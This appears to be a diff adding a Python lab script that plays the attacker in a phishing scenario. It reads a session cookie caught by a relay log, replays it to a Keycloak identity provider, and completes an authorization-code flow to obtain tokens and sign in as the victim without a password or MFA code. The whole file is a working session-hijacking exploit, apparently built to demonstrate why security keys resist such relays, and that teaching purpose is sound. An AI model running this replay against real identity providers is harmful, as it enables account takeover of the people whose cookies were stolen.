@@ -1,0 +1,102 @@
+#!/usr/bin/env python3
+"""attacker-replay: the attacker's side of the phishing scam, lab scenery.
+
+It takes the session cookie the relay caught and shows it to the real
+identity provider, which already treats that cookie as a signed-in session,
+and gets a fresh token for the person: no password, no code. If the person
+signed in with a security key, the relay caught no usable cookie and this
+gets nothing.
+"""
+
+import base64
+import hashlib
+import json
+import os
+import re
+import sys
+import urllib.parse
+import urllib.request
+
+LOG = "/srv/relay.log"
+ISSUER = "https://login.shop.test/realms/shop"
+CLIENT = "trace-cli"
+REDIRECT = "http://127.0.0.1:8400/callback"
+
+
+def b64url(data):
+    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
+
+
+def caught_cookie():
+    try:
+        text = open(LOG).read()
+    except OSError:
+        return None
+    found = re.findall(r"caught session cookie: (KEYCLOAK_IDENTITY=[^\s]+)", text)
+    return found[-1] if found else None
+
+
+def main():
+    cookie = caught_cookie()
+    if not cookie:
+        print("the relay caught no session cookie to replay")
+        return 0
+    with urllib.request.urlopen(
+        ISSUER + "/.well-known/openid-configuration", timeout=15
+    ) as answer:
+        meta = json.load(answer)
+    verifier = b64url(os.urandom(32))
+    query = {
+        "client_id": CLIENT,
+        "response_type": "code",
+        "scope": "openid",
+        "redirect_uri": REDIRECT,
+        "state": os.urandom(8).hex(),
+        "nonce": os.urandom(8).hex(),
+        "code_challenge": b64url(hashlib.sha256(verifier.encode()).digest()),
+        "code_challenge_method": "S256",
+    }
+    url = meta["authorization_endpoint"] + "?" + urllib.parse.urlencode(query)
+    request = urllib.request.Request(url, headers={"Cookie": cookie})
+
+    class NoRedirect(urllib.request.HTTPRedirectHandler):
+        def redirect_request(self, *_):
+            return None
+
+    opener = urllib.request.build_opener(NoRedirect)
+    try:
+        answer = opener.open(request, timeout=15)
+        location = answer.headers.get("Location", "")
+    except urllib.error.HTTPError as error:
+        location = error.headers.get("Location", "")
+    code = dict(urllib.parse.parse_qsl(urllib.parse.urlsplit(location).query)).get(
+        "code"
+    )
+    if not code:
+        print(
+            "the stolen cookie was not enough to sign in (the provider asked for a sign-in)"
+        )
+        return 0
+    form = {
+        "grant_type": "authorization_code",
+        "code": code,
+        "redirect_uri": REDIRECT,
+        "client_id": CLIENT,
+        "code_verifier": verifier,
+    }
+    token_request = urllib.request.Request(
+        meta["token_endpoint"], data=urllib.parse.urlencode(form).encode()
+    )
+    with urllib.request.urlopen(token_request, timeout=15) as reply:
+        tokens = json.load(reply)
+    payload = tokens["id_token"].split(".")[1]
+    payload += "=" * (-len(payload) % 4)
+    who = json.loads(base64.urlsafe_b64decode(payload)).get(
+        "preferred_username", "the user"
+    )
+    print(f"signed in as {who} without a password or a code")
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
